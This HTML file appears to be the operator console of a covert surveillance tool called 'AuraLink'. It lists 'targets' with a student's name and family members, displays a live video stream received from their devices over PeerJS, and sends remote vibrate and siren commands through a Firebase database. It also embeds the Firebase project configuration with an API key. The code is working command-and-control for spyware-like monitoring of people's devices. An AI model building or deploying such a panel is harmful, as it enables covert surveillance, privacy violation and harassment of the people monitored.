<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AuraLink Master Panel | KP Monitoring</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-white flex h-screen">

    <!-- Sidebar -->
    <aside class="w-80 border-r border-slate-800 p-6 flex flex-col">
        <h1 class="text-xl font-black text-green-500 italic mb-10">PESHAWAR CONTROL</h1>
        <div id="user-list" class="space-y-4">
            <!-- Active Users will pop up here -->
        </div>
    </aside>

    <!-- Monitor -->
    <main class="flex-1 p-8 grid grid-cols-12 gap-8">
        <div class="col-span-8">
            <div class="bg-black rounded-3xl overflow-hidden border-2 border-green-600 aspect-video relative">
                <video id="master-video" autoplay playsinline class="w-full h-full"></video>
                <div class="absolute top-4 left-4 bg-red-600 px-3 py-1 rounded-full text-xs font-bold animate-pulse">LIVE NODE</div>
            </div>
            <div class="mt-6 flex gap-4">
                <button onclick="sendCmd('vibrate')" class="bg-white/10 px-6 py-3 rounded-xl hover:bg-green-600">VIBRATE</button>
                <button onclick="sendCmd('beep')" class="bg-white/10 px-6 py-3 rounded-xl hover:bg-green-600">PLAY SIREN</button>
                <button onclick="document.getElementById('master-video').requestFullscreen()" class="bg-white/10 px-6 py-3 rounded-xl ml-auto">FULL SCREEN</button>
            </div>
        </div>

        <div class="col-span-4 space-y-6">
            <div class="bg-slate-800 p-6 rounded-3xl border border-slate-700">
                <h3 class="text-xs font-bold text-slate-500 uppercase mb-4">Target Intelligence</h3>
                <div class="space-y-2 text-sm">
                    <p>Student: <span id="det-name" class="text-green-400 font-bold">--</span></p>
                    <p>Father: <span id="det-father">--</span></p>
                    <p>Brother: <span id="det-brother">--</span></p>
                    <p>Device: <span id="det-model" class="text-slate-400">--</span></p>
                    <p>Battery: <span id="det-bat">--</span></p>
                </div>
            </div>
        </div>
    </main>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCvsSmO56lQ37M43Zm-zSY7pduzqgR-Ka4",
            authDomain: "auralink-2026.firebaseapp.com",
            projectId: "auralink-2026",
            databaseURL: "https://auralink-2026-default-rtdb.firebaseio.com",
            appId: "1:801004659604:web:9fbcf2b2d88696d9afa581"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const peer = new Peer("AURALINK_MASTER_2026");

        let activeTarget = null;

        peer.on('call', (call) => {
            call.answer();
            call.on('stream', (s) => {
                document.getElementById('master-video').srcObject = s;
            });
        });

        // Sync Sidebar from Firebase
        db.ref('sessions').on('value', (snap) => {
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            snap.forEach((child) => {
                const u = child.val();
                const btn = document.createElement('div');
                btn.className = "p-4 bg-slate-800 rounded-2xl cursor-pointer hover:bg-green-900 border border-slate-700";
                btn.innerHTML = `<div class="font-bold">${u.name || 'Anonymous User'}</div><div class="text-[10px] text-slate-500">${u.id}</div>`;
                btn.onclick = () => {
                    activeTarget = u.id;
                    document.getElementById('det-name').innerText = u.name || 'Waiting for Form...';
                    document.getElementById('det-father').innerText = u.father || '--';
                    document.getElementById('det-brother').innerText = u.brother || '--';
                    document.getElementById('det-model').innerText = u.model;
                    document.getElementById('det-bat').innerText = u.battery;
                };
                list.appendChild(btn);
            });
        });

        function sendCmd(act) {
            if(activeTarget) {
                db.ref('commands/' + activeTarget).set({ action: act, time: Date.now() });
            }
        }
    </script>
</body>
</html>
